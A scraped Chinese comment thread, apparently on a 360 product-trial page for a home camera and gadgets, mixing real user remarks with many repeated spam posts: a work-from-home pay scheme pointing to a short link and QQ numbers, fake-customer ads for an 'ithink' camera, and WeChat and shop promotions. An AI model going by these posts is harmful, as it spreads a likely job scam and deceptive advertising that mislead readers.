～ ～不限制工作时间，做的越多  挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到   浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到  浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
哎~这么晚出来我以为是什么震惊之作呢，早在5年前美国就有了 ，前年埃森客公司也推出一款产品 【ithink网络摄像机】 360的还不能插卡 云储存非常不安全已经被美国公民放弃使用了，想了解更多内幕http://detail.tmall.com/item.htm?id=38101267775&amp;spm=0.0.0.0.UBywju&amp;mt=
HTC的8720万像素摄像头渣渣，还是三星好
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
如果试用的好，肯定大力推广给朋友
很漂亮  设计不错哟
我喜欢新产品，更喜欢电子产品
这个真是太棒了，真的很想试用一个来感受下，支持！
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～ 每夭5o~15o，我详细作讲解～ 
谢谢360的提供，我会继续使用的。
有没有一款手环同时有以下功能：日程管理，用震动提醒，当然含睡眠监测、智能无声闹钟，运动管理
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
非常酷的一款表，个性强，期待中。
360家庭卫士是传递温暖的贴心助手，感谢360！
这么好的产品，希望能得到一个免费试用.
觉得很有用，这么新奇的东西很想试试，喜欢新鲜的东西
我经常到北京出差，对家里的老婆不放心啊，我怕被戴绿帽子啊。热烈期待啊啊啊。、
这么爽！！！！！
本人做安防的。真的很想试用一个来感受下
360强大！！永远支持！！
产品的外观和功能都很人性化，与广大的网友互动体现了以人为本，贴近生活；期待有更酷、更智能的产品上线。支持360...
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询  ～每夭5o~15o，我详细作讲解～ 
很吸引人的产品
如果价格1000以下就好了 
实用创新，期待已久，期盼快速发售。赞赏开发者的创意，支持。
好喜欢，期待早些上市
好期待自己能够中签哦，我很需要一个。
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
有别于传统的净化器，真的太神奇了，期待开发成功的那一天一定要试试
这个不错，可以拥有 
轨道上跑的车要智能干什么？
联想也有此项服务
这个很好，希望在手机上看的带宽，控制好
永远支持你···360加油！！
小设计，但是以前真的没人想到过
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛  http://detail.tmall.com/item.htm?spm=a220z.1000880.0.0.6j9dC0&amp;id=38101267775
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每 夭5o~15o，我详细作讲解～  
不管好不好，用过才知道，空口白话，谁都会！ok
预约个毛 老是说邮件地址不对 
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛 http://detail.tmall.com/item.htm?spm=a220z.1000880.0.0.6j9dC0&amp;id=38101267775  
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛 http://detail.tmall.com/item.htm?spm=a220z.1000880.0.0.6j9dC0&amp;id=38101267775  
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛 http://detail.tmall.com/item.htm?spm=a220z.1000880.0.0.6j9dC0&amp;id=38101267775  
即使有幸抽一个给你，每个房间都要装一个，另外的不是就要你掏腰包了么，这是一种营销策略哦
连手机电池都比它大！
我是咱360的忠实用户  特别想拥有一个 
呵呵（Czj）
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛 http://detail.tmall.com/item.htm?spm=a220z.1000880.0.0.6j9dC0&amp;id=38101267775  
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛 http://detail.tmall.com/item.htm?spm=a220z.1000880.0.0.6j9dC0&amp;id=38101267775  
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛 http://detail.tmall.com/item.htm?spm=a220z.1000880.0.0.6j9dC0&amp;id=38101267775  
什么时候老百姓能够用得起
360现在什么都有了。手机wifi摄像头的什么的
喜欢，，有这个家庭卫士孩子一个人在家的时候就可以看着了，不用老是担心他会不会调皮捣蛋了。
来一个！支持360！
捉jian神器……
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
为什么涨价了 
～ ～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～ 每夭5o~15o，我详细作讲解～  
希望我是这50个人中的一个
～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
720P  15帧率的，那不是很卡 ，很延时，这样的机器 还敢卖吗？
支持埃森客产品，之前有在天猫上卖过，用着还不错http://detail.tmall.com/item.htm?spm=a220z.1000880.0.0.6j9dC0&amp;id=38101267775
太吸引人了，希望希望中啊！
给力！赞一个！
家里正考虑买一个，希望能抽到！！！！360，挺你！！
会不会泄露家庭隐私啊
 ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
 ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～ 每夭5o~15o，我详细作讲解～ 
看广告好似适用！
产品很好，价格是个问题 
多少钱 刚需呀！
我也用过~~现在买2块钱~~~
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛http://detail.tmall.com/item.htm?id=38101267775
云监控 互联网视频通讯   “掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。  关爱家人：千里之外，孩子老人宠物，在你的手机里，随时随地，想看就看。 安全防盗、店铺管理：出门在外，云摄像头的移动侦测功能第一时间发现非法入侵并报警，随时随地拿出手机监管商铺，查看员工的工作状态和货物销售情况，防止财物的失窃。 q44463425 微信请加。 
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛http://detail.tmall.com/item.htm?id=38101267775 
云监控 互联网视频通讯 “掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 关爱家人：千里之外，孩子老人宠物，在你的手机里，随时随地，想看就看。 安全防盗、店铺管理：出门在外，云摄像头的移动侦测功能第一时间发现非法入侵并报警，随时随地拿出手机监管商铺，查看员工的工作状态和货物销售情况，防止财物的失窃。 q44463425 微信请加。   
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 关爱家人：千里之外，孩子老人宠物，在你的手机里，随时随地，想看就看。 安全防盗、店铺管理：出门在外，云摄像头的移动侦测功能第一时间发现非法入侵并报警，随时随地拿出手机监管商铺，查看员工的工作状态和货物销售情况，防止财物的失窃。 q44463425 微信请加。在线体验请加微信q44463425    
USB接口没那么大啊
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～ 每夭5o~15o，我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o，我详细作讲解～  
这个东西很试用，期待赶紧发售吧，我想买一个
希望能抽中
很不错·  决定赞你一下。
呵呵，希望能抽中啊，之前在http://detail.tmall.com/item.htm?id=38101267775买了一个，在抽中这个跟Ithink的比一下，看看那个比较好。
就送50个，肯定没戏了。从小到大，从来没中过奖
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛http://detail.tmall.com/item.htm?id=38101267775  
希望可以抓拍移动侦测
好喜欢，赶紧试用成功吧！！！
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 关爱家人：千里之外，孩子老人宠物，在你的手机里，随时随地，想看就看。 安全防盗、店铺管理：出门在外，云摄像头的移动侦测功能第一时间发现非法入侵并报警，随时随地拿出手机监管商铺，查看员工的工作状态和货物销售情况，防止财物的失窃。 q44463425 微信请加。在线体验请加微信q44463425  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 关爱家人：千里之外，孩子老人宠物，在你的手机里，随时随地，想看就看。 安全防盗、店铺管理：出门在外，云摄像头的移动侦测功能第一时间发现非法入侵并报警，随时随地拿出手机监管商铺，查看员工的工作状态和货物销售情况，防止财物的失窃。 q44463425 微信请加。在线体验请加微信q44463425  
是啊.建议有个夜视功能. 加点价.....
好东西啊！
这个东西多少钱呀，想买个，使用估计是够呛了
啥时候出来，整一个试试
我已经丢过好几个手机了，赶快出，
话说这么个设备在现代社会家庭中确实值得有一件。 但前提是数据的准确性没有一个对比，单纯的依靠该设备产生的数据来判定一个人的健康程度真心有点太唐突。还有就是文中提到的，操作太复杂了·  估计相比这个老人们更愿意相信一台体重秤。。。。。。 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o，我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
可以做车载移动影院
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）
试一下，非常想拥有小蜜。
顶，牛牛牛牛牛。
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
希望能中，期待中！！！！！！！！！！！！！
昨天的梦特别好，梦见鱼了，哈哈，希望能中，家里有台Ithink的摄像机，可以用移动电源供电，随时移动效果很好，期待这个，网址：http://detail.tmall.com/item.htm?id=38101267775
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询  ～ 每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询  ～ 每夭5o~15o， 我详细作讲解～  
玛尼玛尼哄·  中！ 
我用的ithink摄像机  外观小巧 使用简单 只需接通电源，不需要连接网线 独有视频锁  安全性高，非常好用  欢迎购买哦  大家可以看一下作出比较的 http://detail.tmall.com/item.htm?id=38101267775 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
申请了好多次了，没中一个！
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛http://detail.tmall.com/item.htm?id=38101267775  
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以去他们店看下对比下，货比三家嘛http://detail.tmall.com/item.htm?id=38101267775  
啥时能买到呀,永远支持360
家中养了猫咪，前几天还关注网络摄像头呢，没想到360就出来了。真棒啊，觉得现在很多产品都离不开360了。
最好可以选择内存卡储存和云储存多几种方式，毕竟都是隐私，安全第一。
 之前在http://detail.tmall.com/item.htm?id=38101267775买了一个Ithink的外观挺漂亮是我喜欢的款，安装方便，真心的不错，有需要的朋友可以去看看啊！是用过才会说好 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭5o~15o， 我详细作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭 5o~15o， 我详细作讲解～  
这个让我中吧，啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊
之前在http://detail.tmall.com/item.htm?id=38101267775买了一个Ithink的外观挺漂亮是我喜欢的款，安装方便，真心的不错，有需要的朋友可以去看看啊！是用过才会说好  
之前在http://detail.tmall.com/item.htm?id=38101267775买了一个Ithink的外观挺漂亮是我喜欢的款，安装方便，真心的不错，有需要的朋友可以去看看啊！是用过才会说好  
之前在http://detail.tmall.com/item.htm?id=38101267775买了一个Ithink的外观挺漂亮是我喜欢的款，安装方便，真心的不错，有需要的朋友可以去看看啊！是用过才会说好  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭 5o~15o， 我详细作讲解～  
目前，该产品的创意没有足够的新颖和超出一般水平，奇酷会不断研发超乎你想象的智能穿戴设备，敬请期待
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每 夭 5o~15o， 我详细作讲解～  
我正想买个摄像头呢 360就给了 真给了 先谢了
看起来好给力，360的产品总是带给我贴心的感觉，希望360越来越强大
之前在http://detail.tmall.com/item.htm?id=38101267775买了一个Ithink的外观挺漂亮是我喜欢的款，安装方便，真心的不错，有需要的朋友可以去看看啊！是用过才会说好   
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每 夭 5o~15o， 我详细 作讲解～  
这个东西，好像挺神奇的！！！
很期待，不过稍显笨重，价格还很贵，在中国达到3000了，都可以买电动车了。建议价格能控制在1000内，值得拥有。实用性不是很强。耍酷必备。
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每 夭 5o~15o， 我详细 作讲解～   
看到介绍很想拥有它，因为它具有远程控制，不在家也能控制通电的电器
本店主营服装http://shop111978255.taobao.com 进去看下有自己喜欢的吗/爱心 /爱心 /爱心 /玫瑰  记得收藏
现在正在使用一款ithink智能远程摄像机，安装特别简捷方便，随时随地查看家里特别方便，还能随时移动，最主要的是还可以用移动电源供电，这样宝宝出去的时候，也能看到特别喜欢，跟同事介绍都要买，看到360这款有试用，希望能够申请到，一定会认真的写试用报告哦
产品的外观和功能都很人性化，与广大的网友互动体现了以人为本，贴近生活；期待有更酷、更智能的产品上线。支持360... 
本店主营服装http://shop111978255.taobao.com 进去看下有自己喜欢的吗/爱心 /爱心 /爱心 /玫瑰  记得收藏
很喜欢，什么时候上市呀，急急急
个人很喜欢轮滑，鉴于一直没学会，想看看，不动是不是能滑走
之前购买的ithink的无线摄像机，感觉很不错，质感及功能算是领先，高清非常棒，真是防狼防盗防小三。http://detail.tmall.com/item.htm?id=38101267775分享给大家。
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每 夭 5o~15o， 我详细 作讲解～  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  即可报名咨询 ～ 每 夭 5o~15o， 我详细 作讲解～  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 关爱家人：千里之外，孩子老人宠物，在你的手机里，随时随地，想看就看。 安全防盗、店铺管理：出门在外，云摄像头的移动侦测功能第一时间发现非法入侵并报警，随时随地拿出手机监管商铺，查看员工的工作状态和货物销售情况，防止财物的失窃。 q44463425 微信请加。在线体验请加微信q44463425  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可 报名咨询 ～ 每 夭 5o~15o， 我详细 作讲解～  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 关爱家人：千里之外，孩子老人宠物，在你的手机里，随时随地，想看就看。 安全防盗、店铺管理：出门在外，云摄像头的移动侦测功能第一时间发现非法入侵并报警，随时随地拿出手机监管商铺，查看员工的工作状态和货物销售情况，防止财物的失窃。 q44463425 微信请加。在线体验请加微信q44463425  
好强大的一款设计，有钱了买一个，送亲戚朋友几个，真多是好东西。
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 关爱家人：千里之外，孩子老人宠物，在你的手机里，随时随地，想看就看。 安全防盗、店铺管理：出门在外，云摄像头的移动侦测功能第一时间发现非法入侵并报警，随时随地拿出手机监管商铺，查看员工的工作状态和货物销售情况，防止财物的失窃。 q44463425 微信请加。在线体验请加微信q44463425  
之前在http://detail.tmall.com/item.htm?id=38101267775买了一个Ithink的外观挺漂亮是我喜欢的款，安装方便，真心的不错，有需要的朋友可以去看看啊！是用过才会说好 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每 夭 5o~15o， 我详细 作讲解～  
手环很好看啊，颜色可以多一点，如果可以选择做成透明色，夜晚还可以发光就更炫了
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 关爱家人：千里之外，孩子老人宠物，在你的手机里，随时随地，想看就看。 安全防盗、店铺管理：出门在外，云摄像头的移动侦测功能第一时间发现非法入侵并报警，随时随地拿出手机监管商铺，查看员工的工作状态和货物销售情况，防止财物的失窃。 q44463425 微信请加。在线体验请加微信q44463425  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每 夭 5o~15o， 我详细 作讲解～   ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每 夭 5o~15o， 我详细 作讲解～  
贱人，打你吗的广告
之前在http://detail.tmall.com/item.htm?id=38101267775买了一个Ithink的外观挺漂亮是我喜欢的款，安装方便，真心的不错，有需要的朋友可以去看看啊！是用过才会说好 
温度最高只耐40摄氏度，夏天这要搁车里，不晒爆了才怪。。。
不知道传输信号怎么样，不过很期待哦
之前在http://detail.tmall.com/item.htm?id=38101267775买了一个Ithink的外观挺漂亮是我喜欢的款，安装方便，真心的不错，有需要的朋友可以去看看啊！是用过才会说好 
网络摄像头很火.老衲也买了两个ithink网络摄像头.放到寺院里监控那些来偷秘籍的江湖小蟊贼..哈哈哈.前边都是老衲开玩笑的.ithink摄像头的广角很大.市面最美观的就是ithink了.双向语音.TF卡储存(比什么云存储安全多了)等等..http://detail.tmall.com/item.htm?id=38101267775 阿弥陀佛..出家人不大诳语,施主们可以放心购买. 善哉善哉!!!
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每 夭 5o~15o， 我详细 作讲解～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每 夭 5o~15o， 我详细 作讲解～  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。 关爱家人：千里之外，孩子老人宠物，在你的手机里，随时随地，想看就看。 安全防盗、店铺管理：出门在外，云摄像头的移动侦测功能第一时间发现非法入侵并报警，随时随地拿出手机监管商铺，查看员工的工作状态和货物销售情况，防止财物的失窃。 q44463425 微信请加。在线体验请加微信q44463425  
如果能360°转就更好了
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每 夭 5o~15o， 我详细 作讲解～ ～
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭 5o~15o， 我详细 作讲解～ ～
贵了点，不实用
真的好喜欢，感谢360.
之前购买的ithink的无线摄像机，感觉很不错，质感及功能算是领先，高清非常棒，真是防狼防盗防小三。http://detail.tmall.com/item.htm?id=38101267775分享给大家。
之前购买的ithink的无线摄像机，感觉很不错，质感及功能算是领先，高清非常棒，真是防狼防盗防小三。http://detail.tmall.com/item.htm?id=38101267775分享给大家。
中奖率那么低肯定是骗个人信息的，大家别信啊啊啊啊啊啊啊  啊
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭 5o~15o， 我详细 作讲解～ ～ 
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。  q44463425 微信请加。在线体验请加微信q44463425  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。  q44463425 微信请加。在线体验请加微信q44463425  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～每夭 5o~15o， 我详细 作讲解～ ～ 
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。  q44463425 微信请加。在线体验请加微信q44463425  
之前购买的ithink的无线摄像机，感觉很不错，质感及功能算是领先，高清非常棒，真是防狼防盗防小三。http://detail.tmall.com/item.htm?id=38101267775分享给大家。
很神奇，很喜欢
之前在http://detail.tmall.com/item.htm?id=38101267775买了一个Ithink的外观挺漂亮是我喜欢的款，安装方便，真心的不错，有需要的朋友可以去看看啊！是用过才会说好 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭 5o~15o， 我详细 作讲解～ ～ 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名 咨询 ～ 每夭 5o~15o， 我详细 作讲解～ ～ 
相信不会中
360的新产品我每次都会去申请，可是一次也没中，可怜我对360一直这么支持。哎
这个产品的具体情况我想了解 在国外可以用吗？
淘宝众筹里都在配送了
看运气呗,能中当然是最好了
之前看过很多款的，似乎都不太满意，这款功能强大，方便使用，大家可以关注一下
360最近一直都在出新产品 可是我那么关注 也没有得到过一次体验机会唉。喜欢这次能给个机会吧
这个真的有那么神奇    质疑中。。。。。
宅家里赚钱 来吧宅男腐女们 Q80982605
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名 咨询 ～ 每夭 5o~15o， 我详细 作讲解～ ～ 
如果能视频对话不是更好？
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名 咨询 ～ 每夭 5o~15o， 我详细 作 讲解～ ～ 
喜欢这个价格合理就搞一个
我自信，我会努力的!
不错，我喜欢！  
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名 咨询 ～ 每夭 5o~15o， 我详细 作讲解～
一定不会中
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名 咨询 ～ 每夭 5o~15o， 我详细 作讲解～ 
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名 咨询 ～ 每夭 5o~15o， 我详细作讲解～ 
我也是路痴来着- -
之前在http://detail.tmall.com/item.htm?id=38101267775买了一个Ithink的外观挺漂亮是我喜欢的款，安装方便，真心的不错，有需要的朋友可以去看看啊！是用过才会说好  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。  q44463425 微信请加。在线体验请加微信q44463425  
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。  q44463425 微信请加。在线体验请加微信q44463425  
你爱它，就一定会中
一定会中！！！
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名 咨询 ～ 每夭 5o~15o， 我详细作讲解～
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭 5o~15o， 我详细作讲解～
94 看了一圈没发现能监控心率~买来毫无意义
外形很酷，看起来也好用，价格不知道会不会高很多  
悲哀到时候还没有正式发行 老是放烟雾弹
怎么赚a...
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名 咨询 ～ 每夭 5o~15o， 我详细作讲解～
很有创意就是价格有点太贵了
我想代理这个产品，不知道怎么联系办理
一直在关注，从未被关注。。。
～不限制工作时间，做的越多 挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭 5o~15o， 我详细作讲解～
 招聘兼职条件如下：1,18-35周岁男女不限2，自身具备上网条件3，有网购经历者优先  工资待遇：每小时15到85元不等，工资日结想做的加Q80982605 
加Q详谈 80982605
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 即可报名咨询 ～ 每夭 5o~15o， 我详细作讲解～
 招聘兼职条件如下：1,18-35周岁男女不限2，自身具备上网条件3，有网购经历者优先  工资待遇：每小时15到85元不等，工资日结想做的加Q80982605 
才50个试用，360太小气了，看到这么多人争，还是算了
“掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。  q44463425 微信请加。在线体验请加微信q44463425  
你可以关注 “掌控安防咨询”官方微信平台感谢您的关注！您将获取家人 店铺 远程 手机无线 云监控相关资讯。  q44463425 微信请加。在线体验请加微信q44463425  
招聘兼职条件如下：1,18-35周岁男女不限2，自身具备上网条件3，有网购经历者优先  工资待遇：每小时15到85元不等，工资日结想做的加Q80982605 
希望不要卖得太贵 
